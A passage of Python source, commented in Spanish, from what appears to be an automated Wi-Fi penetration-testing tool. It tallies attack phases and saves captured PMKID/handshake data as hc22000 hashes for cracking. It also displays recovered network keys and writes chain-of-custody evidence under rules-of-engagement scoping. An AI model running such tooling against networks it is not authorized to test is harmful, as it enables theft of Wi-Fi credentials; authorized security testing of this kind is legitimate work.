            console.print(f"  [bold green]🔑 CREDENCIAL OBTENIDA:[/bold green] [bold white on blue] {recovered_key} [/bold white on blue] [cyan]({key_type})[/cyan]")

        phase_results[phase] = r
        if phase in ("CAPTURE_PMKID", "CAPTURE_HANDSHAKE") and r == "captured":
            # Guardado automático: captura → hash hc22000 listo para crackeo, sin pasos manuales
            hp = _ensure_hc22000(run_dir)
            if hp:
                try:
                    hsize = os.path.getsize(hp)
                except OSError:
                    hsize = 0
                console.print(f"  [green]✓ hash guardado:[/green] [dim]{os.path.basename(hp)} ({hsize} B) — listo para crackeo[/dim]")
        print_phase_result(phase, r, detail=f"Clave: {key_val}" if key_val else "")

        # Si se crackeó, marcar y continuar hasta REPORT
        if r == "cracked":
            final_result = "cracked"
        elif r == "class_confirmed" and final_result == "pending":
            final_result = "class_confirmed"
        elif r == "eol_confirmed" and final_result == "pending":
            final_result = "eol_confirmed"

    if final_result == "pending":
        # Si ninguna fase marcó resultado, tomar el último no-skipped
        non_skip = [v for v in phase_results.values() if v not in ("skipped", "done", "captured")]
        final_result = non_skip[-1] if non_skip else "exhausted"

    vectors = [p for p in phase_results if p in ATTACK_PHASES and phase_results[p] != "skipped"]
    console.print(f"  [dim]Batería: {len(vectors)}/{len(ATTACK_PHASES)} vectores ejecutados → {final_result}[/dim]")

    if wids_active:
        sensor.stop()

    t_elapsed = round(time.time() - t_start, 1)

    # ── Cadena de custodia + persistencia (nunca rompen la run) ──────────────
    from .roe import write_evidence_manifest, db_path_for
    manifest = write_evidence_manifest(run_dir)
    if manifest:
        console.print(f"  [green]✓ evidencia sellada:[/green] [dim]{len(manifest)} archivos + SHA256SUMS en {run_dir}[/dim]")
    try:
        from .db import init_db, record_run
        session = init_db(db_path_for(scope or {}))
        record_run(session, run_id, target.ssid, target.bssid,
                   final_result, path, phase_results)
        session.close()
    except Exception as exc:
        console.print(f"  [yellow][WARN] BD no persistida ({exc}) — el informe sigue válido[/yellow]")

    # Generar reporte
    reporter = Reporter(target.bssid)
    reporter.print_summary(path, sensor.get_alerts())

    lan_surface = None
    try:
        with open(f"{run_dir}/lan_surface.json") as f:
            lan_surface = json.load(f)
    except (OSError, ValueError):
        pass

    eol_assessment_data = None
    try:
        with open(f"{run_dir}/eol_assessment.json") as f:
            eol_assessment_data = json.load(f)
    except (OSError, ValueError):
        pass

    dpp_assessment_data = None
    try:
        with open(f"{run_dir}/dpp_assessment.json") as f:
            dpp_assessment_data = json.load(f)
    except (OSError, ValueError):
        pass

    return {
        "run_id":        run_id,
        "evidence_dir":  run_dir,
        "evidence_manifest": manifest,
        "lan_surface":   lan_surface,
        "eol_assessment": eol_assessment_data,
        "dpp_assessment": dpp_assessment_data,
        "bssid":         target.bssid,
        "ssid":          target.ssid,
        "path":          path,
        "phase_results": phase_results,
        "result":        final_result,
        "recovered_key": recovered_key,
        "key_type":      key_type,
        "wids_alerts":   len(sensor.get_alerts()),
        "wids_simulated": True,
        "elapsed_sec":   t_elapsed,
        "score":         profile.pin_class,
    }

